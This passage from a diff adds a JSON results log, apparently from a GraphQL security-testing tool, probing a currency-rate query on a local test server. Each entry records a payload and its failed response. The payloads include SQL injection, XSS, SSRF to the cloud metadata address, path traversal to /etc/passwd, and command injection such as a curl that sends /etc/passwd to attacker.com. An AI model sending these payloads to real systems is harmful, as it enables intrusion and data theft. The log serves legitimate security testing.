+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:26:55.845057Z",
+    "count": 45,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<script>alert(document.cookie)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:26:58.183989Z",
+    "count": 46,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"GBP\", foreignCurrencySymbol: \"http://169.254.169.254/latest/meta-data/\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:27:00.803682Z",
+    "count": 47,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; curl https://attacker.com/$(cat /etc/passwd)\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-07T02:27:02.598925Z",
+    "count": 48,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../etc/passwd\", foreignCurrencySymbol: \"JPY\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:27:05.199544Z",
+    "count": 49,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<h1>Free BTC!</h1><iframe src='malicious.site'>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:27:07.221726Z",
+    "count": 50,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n  __typename\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.01,
+        "timestamp": "2025-10-07T02:27:09.764769Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query"
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-07T02:27:09.770422Z",
+        "response_body": {
+          "data": {
+            "s": null,
+            "t": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 51,
+    "timestamp": "2025-10-07T02:27:09.770445Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: getCurrentRate(mainCurrencySymbol: \"USD\")\n  t: getCurrentRate(mainCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-07T02:27:12.019062Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query"
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-07T02:27:12.023391Z",
+        "response_body": {
+          "data": {
+            "s": null,
+            "t": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 52,
+    "timestamp": "2025-10-07T02:27:12.023412Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      fields {\n        name\n        type { name }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:27:14.764617Z",
+    "count": 53,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(name: \"Query\") {\n    fields {\n      name\n      args {\n        name\n        type { name }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:27:16.431682Z",
+    "count": 54,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 33
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:29:20.128920Z",
+    "count": 55,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:29:22.058021Z",
+    "count": 56,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<img src=x onerror=alert(document.domain)>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:29:24.717404Z",
+    "count": 57,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"gopher://internal-api/admin\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:29:27.566044Z",
+    "count": 58,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"$(nc 127.0.0.1 1337)\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:29:29.572240Z",
+    "count": 59,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../../../../../etc/passwd\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:29:32.535290Z",
+    "count": 60,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<iframe src='javascript:alert(1)'>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:29:34.597273Z",
+    "count": 61,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"GBP\", foreignCurrencySymbol: \"*\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-07T02:29:37.437103Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-07T02:29:37.440347Z",
+        "response_body": {
+          "data": {
+            "rateA": null,
+            "rateB": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 62,
+    "timestamp": "2025-10-07T02:29:37.440361Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  rateA: getCurrentRate(mainCurrencySymbol: \"JPY\")\n  rateB: getCurrentRate(mainCurrencySymbol: \"CNY\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-07T02:29:39.688504Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:29:39.693724Z",
+        "response_body": {
+          "data": {
+            "rateA": null,
+            "rateB": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 63,
+    "timestamp": "2025-10-07T02:29:39.693756Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType {\n      name\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.014,
+    "timestamp": "2025-10-07T02:29:41.564378Z",
+    "count": 64,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", __schema: \"EXPLOIT\") \n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:29:43.352205Z",
+    "count": 65,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"__schema\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"__schema\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
